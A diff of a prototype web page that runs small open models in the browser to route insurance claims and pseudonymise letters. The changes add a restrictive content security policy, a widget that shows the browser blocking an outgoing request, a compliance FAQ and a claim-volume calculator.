@@ -3,10 +3,18 @@
 <head>
 
 <meta charset="utf-8">
+<!-- The privacy promise, enforced by the browser rather than by this code: the page may connect only to the site that served it
+     (connect-src 'self'), so no script on it can send what you type to another host. The two CDNs are listed for scripts only:
+     they are the fallback when the self-hosted copies in vendor/ are missing. "Test the lock" on the page tries a request and
+     shows the browser refusing it. -->
+<meta http-equiv="Content-Security-Policy" content="default-src 'self'; connect-src 'self'; script-src 'self' 'unsafe-inline' 'wasm-unsafe-eval' https://cdn.jsdelivr.net https://cdnjs.cloudflare.com; style-src 'self' 'unsafe-inline'; font-src 'self'; img-src 'self' data: blob:; worker-src 'self'; manifest-src 'self'; object-src 'none'; base-uri 'self'; form-action 'none'">
 <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
 <meta name="color-scheme" content="light dark">
-<title>BrowserLLM · TinyLLM. Huge Possibilities.</title>
-<meta name="description" content="Decisions with a probability, running offline in your browser.">
+<title>BrowserLLM · claims decisions on this device</title>
+<meta name="description" content="Two small open models route claims, flag legal threats and vulnerable customers, and pseudonymise documents inside the browser tab. Nothing typed is sent anywhere.">
+<meta property="og:title" content="BrowserLLM · claims decisions on this device">
+<meta property="og:description" content="Route a claim, flag a legal threat or a vulnerable customer, pseudonymise a letter: two small open models, in the browser tab, offline. Every answer carries its probability.">
+<meta property="og:type" content="website">
 <meta name="theme-color" content="#00008F">
 <link rel="manifest" href="manifest.webmanifest">
 <link rel="icon" href="icon.svg" type="image/svg+xml">
@@ -872,6 +880,61 @@
   .install.on { display: inline-flex; }
   .sr { position: absolute; width: 1px; height: 1px; overflow: hidden; clip: rect(0 0 0 0); white-space: nowrap; }
   @media (prefers-reduced-motion: reduce) { * { animation-duration: .01ms !important; animation-iteration-count: 1 !important; transition: none !important; } }
+  /* ===== v9: for an insurer's audience — trust section, the lock test, volume calculator, a lighter phone bar ===== */
+  .trust-grid { display: grid; grid-template-columns: minmax(0, .9fr) minmax(0, 1.1fr); gap: 18px; align-items: start; }
+  @media (max-width: 900px) { .trust-grid { grid-template-columns: 1fr; } }
+  .lock { padding: 18px; display: flex; flex-direction: column; gap: 12px; }
+  @media (min-width: 901px) { .lock { position: sticky; top: 16px; } }
+  .lock-h { display: flex; gap: 12px; align-items: flex-start; }
+  .lock-ic { width: 36px; height: 36px; border-radius: 10px; display: grid; place-items: center; background: var(--axa-blue); color: #fff; flex-shrink: 0; }
+  .lock h3 { font: 700 20px/1.2 var(--display); margin: 2px 0 6px; }
+  .lock .sub { font-size: 13.5px; line-height: 1.45; }
+  .lock textarea { min-height: 72px; width: 100%; padding: 10px 12px; }
+  .lock-row { display: flex; gap: 10px 14px; align-items: center; flex-wrap: wrap; }
+  .lock-out { display: flex; flex-direction: column; gap: 8px; }
+  .lock-out:empty { display: none; }
+  .lk { display: grid; grid-template-columns: 76px 1fr; gap: 10px; padding: 10px 12px; border-radius: 12px; background: var(--mint-bg); font-size: 13.5px; line-height: 1.45; }
+  .lk b { color: var(--mint-fg); } .lk code { font-size: 12px; }
+  .lk.bad { background: var(--red-bg); } .lk.bad b { color: var(--red); }
+  .lk.warn { background: var(--gold-bg); } .lk.warn b { color: var(--gold-fg); }
+  .faq { display: flex; flex-direction: column; gap: 10px; }
+  .faq details { background: #fff; border-radius: 14px; box-shadow: var(--ring), var(--lift); }
+  .faq summary { cursor: pointer; list-style: none; display: flex; justify-content: space-between; align-items: center; gap: 12px; padding: 14px 16px; font: 600 15px/1.3 var(--sans); color: var(--fg-soft); border-radius: 14px; }
+  .faq summary::-webkit-details-marker { display: none; }
+  .faq summary::after { content: ""; width: 9px; height: 9px; flex-shrink: 0; border-right: 2px solid var(--axa-blue); border-bottom: 2px solid var(--axa-blue); transform: rotate(45deg) translate(-2px, -2px); transition: transform .2s; }
+  .faq details[open] summary::after { transform: rotate(-135deg) translate(-2px, -2px); }
+  .faq details[open] summary { color: var(--axa-blue); }
+  .faq .a { padding: 0 16px 6px; font-size: 14px; line-height: 1.55; max-width: 70ch; }
+  .faq .a p { margin: 0 0 10px; }
+  .xp h2 { font: 700 22px/26px var(--display); color: var(--axa-blue); letter-spacing: -.01em; margin: 0 0 8px; text-wrap: balance; }
+  footer h3 { font: 600 13px var(--sans); color: var(--fg); margin: 0 0 6px; letter-spacing: 0; }
+  /* contrast: the mint text on white was 4.33:1 and the tour's step label 3.88:1; both now pass 4.5:1 */
+  html:root, html:root[data-theme] { --mint-fg: #17754C; }
+  .tour-card .fl { color: var(--axa-blue-80); }
+  .hero-band h1, .hero2 .hero-band h1 { text-align: left; margin-left: 0; margin-right: 0; }
+  .hero-band .lede { max-width: 54ch; }
+  .tc-viz { display: grid; place-items: center; }   /* the tour's pictures sat against the card's top edge, clipped by its corners */
+  /* volume calculator under the threshold */
+  .vol { display: flex; flex-direction: column; gap: 10px; padding-top: 12px; margin-top: 4px; border-top: 1px solid var(--border); }
+  .vol-in { display: flex; flex-wrap: wrap; gap: 8px 14px; align-items: center; font-size: 13.5px; }
+  .vol-in input { width: 116px; height: 32px; padding: 0 10px; font-variant-numeric: tabular-nums; }
+  .vol-out { display: grid; grid-template-columns: repeat(3, minmax(0, 1fr)); gap: 8px; }
+  .vol-out div { background: var(--bg-subtle); border-radius: 12px; box-shadow: var(--ring); padding: 10px 12px; display: flex; flex-direction: column; gap: 4px; }
+  .vol-out b { font: 700 22px/1.05 var(--display); color: var(--axa-blue); font-variant-numeric: tabular-nums; }
+  .vol-out span { font-size: 12px; color: var(--muted-fg); line-height: 1.35; }
+  @media (max-width: 520px) { .vol-out { grid-template-columns: 1fr; } }
+  /* the chart's labels stay legible when the chart is drawn narrow */
+  @media (max-width: 520px) { svg.chart text { font-size: 13px; } }
+  /* phones: the bar keeps its status and its button; the per-model chips live in the expanded panel */
+  @media (max-width: 760px) {
+    .dock, .dock[data-live="on"], .dock[data-live="busy"] { left: 8px; right: 8px; bottom: 8px; border-radius: 18px; }
+    .dock-bar { flex-wrap: nowrap; gap: 10px; padding: 8px 10px; min-height: 0; }
+    .dock-models { display: none; }
+    .ds-t span { display: none; }
+    .dock .btn.primary, html:root .dock .btn.primary { height: 40px; padding: 0 14px; font-size: 13px; }
+    .dock-more { width: 40px; height: 40px; }
+    body { padding-bottom: 84px; }
+  }
 </style>
 
 </head>
@@ -894,9 +957,16 @@
   <a href="#meter" data-sec="meter">Usage meter<span class="k">live</span></a>
   <h5>Privacy</h5>
   <a href="#private" data-sec="private">Redactor &amp; variants</a>
+  <a href="#trust" data-sec="trust">IT, risk &amp; compliance<span class="k">test</span></a>
   <h5>Context</h5>
   <a href="#news" data-sec="news">What TypeSafe launched</a>
   <a href="#models" data-sec="models">Open models</a>
+  <!-- shown only where the rest of the lab is served beside this page (the Railway copy, under /second-look/) -->
+  <div id="sideLab" hidden>
+  <h5>More from the lab</h5>
+  <a href="../">Claim form filled by a 360M model</a>
+  <a href="../chat.html">Chat with a small model</a>
+  </div>
   </nav>
   <div class="side-tour"><a href="#top-intro" id="tourReplay"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="12" cy="12" r="9"/><path d="M12 16v-4M12 8h.01"/></svg>Replay the guided tour</a></div>
   <div class="side-models" id="sideModels" data-live="off">
@@ -910,15 +980,15 @@
   <div class="hero2" id="top-intro">
     <div class="hero-band">
     <div class="hero-copy">
-    <span class="chip">BrowserLLM</span>
-    <h1>TinyLLM. <em>Huge Possibilities.</em></h1>
-    <p class="lede">Offline. Private. Nothing leaves this device.</p>
+    <span class="chip">BrowserLLM · a working prototype</span>
+    <h1>Claims decisions, <em>on this device.</em></h1>
+    <p class="lede">Two small open models route claims, flag legal threats and vulnerable customers, and pseudonymise letters inside this browser tab. Nothing you type leaves the device. Every answer carries its probability, so the handler decides what goes straight through.</p>
     <div class="ctas">
       <button class="btn primary" id="dlBtn" type="button">
         <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M12 3v12"/><path d="m7 10 5 5 5-5"/><path d="M5 21h14"/></svg>
         <span id="dlText">Download the models · 57 MB</span>
       </button>
-      <a class="btn" href="#decisions">See the decisions</a>
+      <button class="btn" id="tourStartBtn" type="button">Take the 2-minute tour</button>
       <button class="btn install" id="installBtn" type="button" title="Install the page as an app: it then opens with no connection">Install app</button>
     </div>
     <div class="hint" id="heroHint">Best in a recent Chrome, Edge or Firefox. First download 10–60 s, then cached.</div>
@@ -932,7 +1002,7 @@
     </div>
 
     <div class="xp" id="xp" data-step="1">
-      <div class="xp-steps" role="tablist">
+      <div class="xp-steps">
         <button class="xp-step" type="button" data-go="1" data-st="on"><span class="n"><span>1</span></span><span><b>Get a sample file</b>A Word document with personal data</span></button>
         <button class="xp-step" type="button" data-go="2"><span class="n"><span>2</span></span><span><b>Upload it here</b>Read by this tab, not sent</span></button>
         <button class="xp-step" type="button" data-go="3"><span class="n"><span>3</span></span><span><b>See the result</b>What was found, what to share</span></button>
@@ -941,7 +1011,7 @@
       <div class="xp-pane" data-pane="1">
         <div class="xp-intro">
           <div>
-            <h3>Anonymise a document. Offline.</h3>
+            <h2>Anonymise a document. Offline.</h2>
             <p>A claim letter with invented names, phone, email, IBAN, card number and address.</p>
             <div class="ctas" style="justify-content:flex-start;margin-top:20px;">
               <button class="btn primary" id="xpDownload" type="button"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M12 3v12"/><path d="m7 10 5 5 5-5"/><path d="M5 21h14"/></svg>Download sample .docx</button>
@@ -955,7 +1025,7 @@
         </div>
       </div>
       <div class="xp-pane" data-pane="2" hidden>
-        <h3>Drop the file</h3>
+        <h2>Drop the file</h2>
         <p>Read by this tab. The request counter below will not move.</p>
         <label class="xp-drop" id="anonDrop" for="anonFile" style="margin-top:18px;">
           <svg width="30" height="30" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M14 3H7a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h10a2 2 0 0 0 2-2V8z"/><path d="M14 3v5h5"/><path d="M12 18v-6"/><path d="m9 15 3-3 3 3"/></svg>
@@ -986,7 +1056,7 @@
         </div>
       </div>
       <div class="xp-pane" data-pane="4" hidden>
-        <h3>What just happened, step by step</h3>
+        <h2>What just happened, step by step</h2>
         <div class="xp-how">
           <div><b>1 · The file stayed here</b><p>Unzipped and read in memory. No request.</p></div>
           <div><b>2 · Rules caught formats</b><p>Emails, phones, IBANs, cards, dates, addresses.</p></div>
@@ -1057,9 +1127,16 @@
           </div>
           <div class="card" style="display:flex;flex-direction:column;gap:10px;">
             <div class="title-sm">Set the threshold</div>
-            <div class="thresh"><span>Act at p ≥</span><input type="range" id="testT" min="0.05" max="0.95" step="0.05" value="0.3"><output id="testTOut">0.30</output></div>
+            <div class="thresh"><span>Act at p ≥</span><input type="range" id="testT" min="0.05" max="0.95" step="0.05" value="0.6" aria-label="Threshold: act at this probability or above"><output id="testTOut">0.60</output></div>
             <div id="testOutcome" style="font-size:14px;"></div>
             <div class="sub" id="testNote"></div>
+            <div class="vol" id="vol">
+              <div class="title-sm">At your volume</div>
+              <div class="vol-in"><label>Claims a year <input type="number" id="volN" min="0" step="1000" value="100000"></label>
+                <label>Minutes to route one by hand <input type="number" id="volMin" min="0" max="120" step="0.5" value="3"></label></div>
+              <div class="vol-out" id="volOut"></div>
+              <div class="sub" id="volNote"></div>
+            </div>
           </div>
         </div>
         <details>
@@ -1116,9 +1193,50 @@
     </div>
   </section>
 
+  <section id="trust">
+    <div class="sec-head">
+      <div class="eyebrow">05 · For IT, risk and compliance</div>
+      <h2>What a pilot has to answer first</h2>
+      <p>Short answers, each one something you can check on this page or in the lab's files.</p>
+    </div>
+    <div class="trust-grid">
+      <div class="card lock" id="lock">
+        <div class="lock-h">
+          <span class="lock-ic" aria-hidden="true"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="4" y="11" width="16" height="10" rx="2"/><path d="M8 11V7a4 4 0 0 1 8 0v4"/></svg></span>
+          <div><h3>Test the lock</h3>
+            <p class="sub">This page carries a browser security policy that lets it connect to the site that served it and nowhere else. Try to send the text below to another website: your browser refuses before anything leaves.</p></div>
+        </div>
+        <textarea id="lockText" aria-label="Text to try to send">Mrs Claire Moreau, policy HAB-2291-4471, IBAN FR76 3000 6000 0112 3456 7890 189</textarea>
+        <div class="lock-row"><button class="btn primary" id="lockRun" type="button">Try to send it to example.org</button><span class="sub">Two attempts: a script request and a tracking pixel.</span></div>
+        <div class="lock-out" id="lockOut" aria-live="polite"></div>
+      </div>
+      <div class="faq">
+        <details open><summary>Where does the text go?</summary><div class="a">
+          <p>Nowhere. The runtime, the tokenizer and both models run in this tab, on this device's processor. After the one-time download the request counter in the bar below stays at zero, and the browser itself forbids connections to any other site: test it on the left. DevTools → Network shows the same.</p></div></details>
+        <details><summary>Is a pseudonymised letter anonymous?</summary><div class="a">
+          <p>No. Swapping names, IBANs and phone numbers for placeholders is pseudonymisation, and the result is still personal data under the GDPR (Recital 26). It reduces what reaches a partner; it does not replace a legal basis for sharing.</p>
+          <p>The redactor also misses things. Measured on 900 test documents with the rules alone: on French claim letters like the sample it found 95 % of names, and 12 % of letters still kept an identifier; on a harder public set it found far fewer. A person reads the result before it is shared.</p></div></details>
+        <details><summary>Who makes the decision?</summary><div class="a">
+          <p>The handler. Every answer carries a probability and the business sets the threshold: above it a decision can go straight through, below it a person looks. Lower the threshold and more cases reach a person. A production use would go through the group's AI governance and model-risk review; this page is a prototype on synthetic data.</p></div></details>
+        <details><summary>How accurate is it?</summary><div class="a">
+          <p>Measured on messages written for this page, in English, not AXA data. Claim routing: 79 % right on 29 messages; at p ≥ 0.60, 76 % go straight through and 86 % of those are right. Legal-threat and vulnerable-customer flags: AUC 0.98 on 30 messages. Urgency: rank correlation 0.44, too weak to use. Run the test above to measure it on this device.</p></div></details>
+        <details><summary>What does a decision cost?</summary><div class="a">
+          <p>Nothing per call: no provider and no per-token bill. A decision takes tens of milliseconds on a laptop processor; the usage meter shows this device's own times. The costs are the one-time 59 MB download and the device's electricity.</p></div></details>
+        <details><summary>What does a laptop need?</summary><div class="a">
+          <p>A recent Chrome, Edge or Firefox with WebAssembly SIMD (the device check in the bar below says whether this one qualifies), about 60 MB of browser storage and about 150 MB of memory while it runs. No installation, no admin rights, no plug-in, no GPU. The page can be installed as an app and then opens with no connection.</p></div></details>
+        <details><summary>Which models, and under which licences?</summary><div class="a">
+          <p>xtremedistil-l6-h256 zero-shot (MIT, Moritz Laurer) and all-MiniLM-L6-v2 (Apache-2.0, sentence-transformers), unchanged from their public releases, run by ONNX Runtime Web (MIT). No non-commercial licence anywhere on the page. The table at the end lists them with their sources.</p></div></details>
+        <details><summary>What about French and German?</summary><div class="a">
+          <p>Both models are English. French and German messages work less well, and that has not been measured here. The redactor's rules do cover French formats: NIR, IBAN, number plates, postcodes and <i>Nom:</i> / <i>Prénom:</i> labels.</p></div></details>
+        <details><summary>What would a pilot measure?</summary><div class="a">
+          <p>One decision, claim routing, on a labelled sample of real claims processed in the EU: accuracy and straight-through rate against the classifier already in place, at a threshold the business chooses. The calibration test above is that experiment in miniature.</p></div></details>
+      </div>
+    </div>
+  </section>
+
   <section id="news">
     <div class="sec-head">
-      <div class="eyebrow">05 · The news</div>
+      <div class="eyebrow">06 · The news</div>
       <h2>Jev, a model that answers software with decisions</h2>
       <p>Launched 15 September 2026. Typed questions in, typed answers out.</p>
     </div>
@@ -1175,7 +1293,7 @@
 
   <section id="models">
     <div class="sec-head">
-      <div class="eyebrow">06 · Models</div>
+      <div class="eyebrow">07 · Models</div>
       <h2>The open models behind this page, and others like them</h2>
       <p>Free, open, and unchanged from their public releases.</p>
     </div>
@@ -1197,9 +1315,9 @@
 
   <footer>
     <div class="cols">
-      <div><h4>What runs where</h4>The page, the runtime, the Word reader and both models are served with the page and kept in this browser: the models in IndexedDB, the rest by a service worker, so a reload works with no connection. Decisions, anonymisation and variants are computed in this tab, on this device's processor.</div>
-      <div><h4>What the counter can see</h4>The request counter in the bar below reads this page's own performance timeline. The models run in the page itself, so their work is inside its view. Your browser's DevTools → Network shows the same.</div>
-      <div><h4>Limits</h4><ul><li>English-language models; French and German text works less well.</li><li>Small models make mistakes: every result shows its probability.</li><li>Numbers under each widget were measured on 30 synthetic messages written for this page.</li></ul></div>
+      <div><h3>What runs where</h3>The page, the runtime, the Word reader and both models are served with the page and kept in this browser: the models in IndexedDB, the rest by a service worker, so a reload works with no connection. Decisions, anonymisation and variants are computed in this tab, on this device's processor.</div>
+      <div><h3>What the counter can see</h3>The request counter in the bar below reads this page's own performance timeline. The models run in the page itself, so their work is inside its view. Your browser's DevTools → Network shows the same, and the page's security policy forbids connections to any other site (<a href="#trust">test it</a>).</div>
+      <div><h3>Limits</h3><ul><li>English-language models; French and German text works less well.</li><li>Small models make mistakes: every result shows its probability.</li><li>Numbers under each widget were measured on 30 synthetic messages written for this page.</li></ul></div>
     </div>
   </footer>
 </main>
@@ -1370,7 +1488,11 @@ async function deviceCheck() {
 }
 
 /* ---------------- network: online state and the request counter ---------------- */
-const net = { readyAt: null, since: 0, offlineRuns: 0 };
+const net = { readyAt: null, since: 0, offlineRuns: 0, seen: [], refused: new Set() };
+// A request the page's security policy refused never left the device, but the browser still lists it in its timeline (a
+// zero-byte, zero-duration entry for a refused image), so the counter leaves out every URL the policy reported refusing.
+function recount() { net.since = net.seen.filter((u) => !net.refused.has(u)).length; renderNet(); }
+document.addEventListener('securitypolicyviolation', (e) => { if (e.blockedURI) { net.refused.add(e.blockedURI); if (net.readyAt != null) recount(); } });
 function renderNet() {
   const on = navigator.onLine;
   const dn = $('#dockNet'); if (!dn) return;
@@ -1385,8 +1507,8 @@ addEventListener('online', renderNet); addEventListener('offline', renderNet);
 try {
   new PerformanceObserver((list) => {
     if (net.readyAt == null) return;
-    for (const e of list.getEntries()) if (e.startTime >= net.readyAt) net.since++;
-    renderNet();
+    for (const e of list.getEntries()) if (e.startTime >= net.readyAt) net.seen.push(e.name);
+    recount();
   }).observe({ type: 'resource', buffered: false });
 } catch (e) { /* older browsers: the counter stays at its last value */ }
 function renderChecks() {
@@ -1675,7 +1797,7 @@ async function loadAll() {
     dock.runtime.st = 'on'; dock.runtime.pct = 100;
     await activate('nli');
     await activate('emb');
-    net.readyAt = performance.now(); net.since = 0;
+    net.readyAt = performance.now(); net.since = 0; net.seen = [];
     renderNet();
     try { if (navigator.storage && navigator.storage.persist) await navigator.storage.persist(); } catch (e) { /* best effort */ }
     state.cached = true;
@@ -1843,7 +1965,7 @@ function widgetHTML(w) {
         <div class="fl">Result</div>
         <div class="result" id="out-${w.id}" aria-live="polite"><div class="empty" data-locked><svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><rect x="4" y="4" width="16" height="16" rx="3"/><path d="M9 9h6v6H9z"/></svg>Turn on the models in the bar below to run this on your device.</div></div>
         <div class="thresh"><span>${w.type === 'score' ? 'Fast-track at score ≥' : 'Act at p ≥'}</span>
-          <input type="range" id="t-${w.id}" min="${w.type === 'score' ? 1 : 0.05}" max="${w.type === 'score' ? 5 : 0.95}" step="${w.type === 'score' ? 0.1 : 0.05}" value="${w.t}">
+          <input type="range" id="t-${w.id}" aria-label="${w.type === 'score' ? 'Fast-track threshold' : 'Threshold: act at this probability or above'}" min="${w.type === 'score' ? 1 : 0.05}" max="${w.type === 'score' ? 5 : 0.95}" step="${w.type === 'score' ? 0.1 : 0.05}" value="${w.t}">
           <output id="to-${w.id}">${w.type === 'score' ? w.t.toFixed(1) : w.t.toFixed(2)}</output></div>
       </div>
     </div>
@@ -1963,7 +2085,7 @@ function setDTab(id) {
 try {
   const links = [...document.querySelectorAll('.side a[data-sec]')];
   const io = new IntersectionObserver((es) => es.forEach((e) => { if (e.isIntersecting) links.forEach((a) => a.classList.toggle('on', a.dataset.sec === e.target.id)); }), { rootMargin: '-40% 0px -55% 0px' });
-  ['top-intro', 'test', 'meter', 'private', 'news', 'models'].forEach((id) => { const el = document.getElementById(id); if (el) io.observe(el); });
+  ['top-intro', 'test', 'meter', 'private', 'trust', 'news', 'models'].forEach((id) => { const el = document.getElementById(id); if (el) io.observe(el); });
 } catch (e) { /* no observer: the sidebar still links */ }
 
 /* ---------------- the telling test ---------------- */
@@ -2000,55 +2122,72 @@ const CASES = [
  ["A delivery driver crashed into our parked car and drove off, but a neighbour filmed his number plate.","Motor",0,0],
 ];
 const TESTS = {
-  legal: { label: 'Legal-threat flag', kind: 'flag', col: 2, t: 0.3,
-    recorded: { auc: 0.984, pos: 0.629, neg: 0.013, npos: 5, n: 30 } },
-  vuln: { label: 'Vulnerable customer', kind: 'flag', col: 3, t: 0.2,
-    recorded: { auc: 0.984, pos: 0.38, neg: 0.06, npos: 5, n: 30 } },
-  route: { label: 'Claim routing', kind: 'route', col: 1, t: 0.6,
-    recorded: { acc: 0.793, n: 29, auto: 0.759, autoAcc: 0.864 } },
+  route: { label: 'Claim routing', kind: 'route', col: 1, t: 0.6 },
+  legal: { label: 'Legal-threat flag', kind: 'flag', col: 2, t: 0.3 },
+  vuln: { label: 'Vulnerable customer', kind: 'flag', col: 3, t: 0.2 },
 };
-const test = { which: 'legal', live: {} };
+const test = { which: 'route', live: {} };
+// Every message's probability from one run of this test in headless Chromium on 25 Sep 2026, with the same models and runtime
+// (its summary equals the figures above: AUC 0.98 and 0.98, routing 79 %). Shown until the test runs on this device, and labelled so.
+const RECORDED_RUN = {"legal":[0.005,0.005,0.007,0.008,0.006,0.871,0.004,0.004,0.011,0.007,0.019,0.018,0.005,0.032,0.009,0.014,0.008,0.008,0.02,0.014,0.855,0.019,0.588,0.01,0.063,0.024,0.009,0.795,0.008,0.009],"vuln":[0.021,0.025,0.023,0.022,0.03,0.147,0.019,0.034,0.039,0.044,0.06,0.206,0.031,0.379,0.519,0.07,0.027,0.168,0.149,0.421,0.048,0.226,0.034,0.04,0.076,0.072,0.025,0.004,0.535,0.016],"route":[[0.922,1],[0.678,0],[0.974,1],[0.99,1],[0.459,1],[0.902,1],[0.945,1],[0.845,1],[0.993,1],[0.428,1],[0.488,0],[0.961,1],[0.999,1],[0.773,0],[0.466,1],[0.989,1],[0.588,0],[0.979,1],[0.998,1],[1.0,1],[0.586,1],[1.0,1],[0.992,1],[0.952,1],[0.999,1],[0.992,1],[0.999,0],[0.502,0],[0.925,1]]};
+function recordedLive() {
+  const flag = (k) => { const p = RECORDED_RUN[k], y = CASES.map((c) => c[TESTS[k].col]);
+    const mean = (f) => { const a = p.filter((_, i) => f(y[i])); return a.reduce((s, x) => s + x, 0) / a.length; };
+    return { p, auc: auc(p, y), pos: mean((v) => v), neg: mean((v) => !v) }; };
+  const rows = RECORDED_RUN.route.map(([p, ok]) => ({ p, ok: !!ok }));
+  return { legal: flag('legal'), vuln: flag('vuln'), route: { rows, acc: rows.filter((r) => r.ok).length / rows.length } };
+}
 function auc(scores, y) {
   let s = 0, n = 0;
   scores.forEach((a, i) => { if (!y[i]) return; scores.forEach((b, j) => { if (y[j]) return; n++; s += a > b ? 1 : a === b ? .5 : 0; }); });
   return n ? s / n : NaN;
 }
 function renderTest() {
-  const T = TESTS[test.which], live = test.live[test.which];
+  // this device's run when there is one, otherwise the recorded run of the same test (labelled as such under the chart)
+  const T = TESTS[test.which], ran = !!test.live[test.which];
+  const live = test.live[test.which] || (test.rec || (test.rec = recordedLive()))[test.which];
   if (!$('#testTabs').children.length) {   // built once: rebuilding them on every render took the keyboard focus away from the pressed button
     $('#testTabs').innerHTML = Object.entries(TESTS).map(([k, v]) => `<button type="button" data-k="${k}">${esc(v.label)}</button>`).join('');
     $('#testTabs').querySelectorAll('button').forEach((b) => b.addEventListener('click', () => { test.which = b.dataset.k; $('#testT').value = TESTS[b.dataset.k].t; renderTest(); }));
   }
   $('#testTabs').querySelectorAll('button').forEach((b) => b.setAttribute('aria-pressed', String(b.dataset.k === test.which)));
   const t = parseFloat($('#testT').value); $('#testTOut').textContent = t.toFixed(2);
-  const src = live ? 'measured on this device just now' : 'recorded 24 Sep 2026 with the same models; run it to measure on this device';
+  const src = ran ? 'measured on this device just now' : 'recorded 25 Sep 2026 in headless Chromium with the same models; run the test to measure it on this device';
   let stats, outcome = '', note = '';
   if (T.kind === 'flag') {
-    const r = live ? { auc: live.auc, pos: live.pos, neg: live.neg } : T.recorded;
-    stats = [[r.auc.toFixed(2), 'AUC: how well it ranks (1.00 is perfect)'], [r.pos.toFixed(2), 'average p on true cases'], [r.neg.toFixed(2), 'average p on the others'], ['5 of 30', 'messages labelled yes']];
-    if (live) {
-      const y = CASES.map((c) => c[T.col]), flagged = live.p.map((p) => p >= t);
-      const tp = flagged.filter((f, i) => f && y[i]).length, fp = flagged.filter((f, i) => f && !y[i]).length, fn = y.filter((v, i) => v && !flagged[i]).length;
-      outcome = `<b>${tp} of ${tp + fn}</b> true cases flagged, <b class="${fp ? 'bad' : 'ok'}">${fp}</b> false alarm${fp === 1 ? '' : 's'}, <b class="${fn ? 'bad' : 'ok'}">${fn}</b> missed.`;
-    } else outcome = 'Run the test to see what this threshold catches and misses.';
+    stats = [[live.auc.toFixed(2), 'AUC: how well it ranks (1.00 is perfect)'], [live.pos.toFixed(2), 'average p on true cases'], [live.neg.toFixed(2), 'average p on the others'], ['5 of 30', 'messages labelled yes']];
+    const y = CASES.map((c) => c[T.col]), flagged = live.p.map((p) => p >= t);
+    const tp = flagged.filter((f, i) => f && y[i]).length, fp = flagged.filter((f, i) => f && !y[i]).length, fn = y.filter((v, i) => v && !flagged[i]).length;
+    outcome = `<b>${tp} of ${tp + fn}</b> true cases flagged, <b class="${fp ? 'bad' : 'ok'}">${fp}</b> false alarm${fp === 1 ? '' : 's'}, <b class="${fn ? 'bad' : 'ok'}">${fn}</b> missed.`;
     note = 'If the probabilities were calibrated, the dots would sit on the diagonal: cases given p 0.6 would be right 6 times in 10. Here the true cases sit far below it. The ranking is usable, but only labelled examples tell you where to put the threshold. A model calibrated out of the box, as Jev claims to be, would let you set it without them.';
   } else {
-    const r = live ? { acc: live.acc } : T.recorded;
-    stats = [[(100 * r.acc).toFixed(0) + ' %', 'right overall'], ['29', 'messages that name a line']];
-    if (live) {
-      const auto = live.rows.filter((x) => x.p >= t), right = auto.filter((x) => x.ok).length;
-      stats.push([(100 * auto.length / live.rows.length).toFixed(0) + ' %', `straight through at p ≥ ${t.toFixed(2)}`], [auto.length ? (100 * right / auto.length).toFixed(0) + ' %' : '–', 'of those routed right']);
-      outcome = `<b>${auto.length}</b> of ${live.rows.length} claims go straight through, <b>${right}</b> of them to the right team. <b>${live.rows.length - auto.length}</b> go to a person.`;
-    } else {
-      stats.push([(100 * T.recorded.auto).toFixed(0) + ' %', 'straight through at p ≥ 0.60'], [(100 * T.recorded.autoAcc).toFixed(0) + ' %', 'of those routed right']);
-      outcome = 'Run the test to move the threshold and watch the trade-off.';
-    }
+    const auto = live.rows.filter((x) => x.p >= t), right = auto.filter((x) => x.ok).length;
+    stats = [[(100 * live.acc).toFixed(0) + ' %', 'right overall'], ['29', 'messages that name a line'],
+      [(100 * auto.length / live.rows.length).toFixed(0) + ' %', `straight through at p ≥ ${t.toFixed(2)}`], [auto.length ? (100 * right / auto.length).toFixed(0) + ' %' : '–', 'of those routed right']];
+    outcome = `<b>${auto.length}</b> of ${live.rows.length} claims go straight through, <b>${right}</b> of them to the right team. <b>${live.rows.length - auto.length}</b> go to a person.`;
     note = 'This is the insurer\'s trade: raise the threshold and fewer claims go straight through, but more of those are right. The claim to test is whether a calibrated model lets you set it without first labelling your own claims.';
   }
   $('#testStats').innerHTML = stats.map(([n, l]) => `<div class="stat"><div class="n">${esc(n)}</div><div class="l">${esc(l)}</div></div>`).join('');
   $('#testOutcome').innerHTML = outcome; $('#testNote').textContent = note;
   $('#chartSub').textContent = src[0].toUpperCase() + src.slice(1) + '.';
   drawChart(T, live);
+  renderVolume(T, live, t, ran);
+}
+// "At your volume": the routing rates above, applied to a volume and a handling time the reader types in. Their numbers,
+// our measured rates; the note under it says what the rates rest on.
+function renderVolume(T, live, t, ran) {
+  const box = $('#vol'); if (!box) return;
+  box.hidden = T.kind !== 'route';
+  if (box.hidden) return;
+  const n = Math.max(0, Math.round(+$('#volN').value || 0)), mins = Math.max(0, +$('#volMin').value || 0);
+  const auto = live.rows.filter((x) => x.p >= t), right = auto.filter((x) => x.ok).length, N = live.rows.length;
+  const through = Math.round(n * auto.length / N), wrong = Math.round(n * (auto.length - right) / N), person = n - through;
+  const round2 = (x) => { if (x < 100) return Math.round(x); const k = 10 ** (Math.floor(Math.log10(x)) - 1); return Math.round(x / k) * k; };   // 29 messages carry two significant figures, not five
+  const fmt = (x) => round2(x).toLocaleString('en-GB'), hours = through * mins / 60;
+  $('#volOut').innerHTML = `<div><b>~${fmt(through)}</b><span>routed with no one reading them first</span></div>
+    <div><b>~${fmt(wrong)}</b><span>of those sent to a wrong team, which re-routes them</span></div>
+    <div><b>~${fmt(person)}</b><span>routed by a person, as today</span></div>`;
+  $('#volNote').textContent = `At p ≥ ${t.toFixed(2)} that is about ${fmt(hours)} handler hours a year no longer spent routing. The rates come from ${N} synthetic English messages (${ran ? 'this device\'s run' : 'the recorded run'}), not from AXA claims: a pilot on a labelled sample is what would make these numbers real.`;
 }
 function drawChart(T, live) {
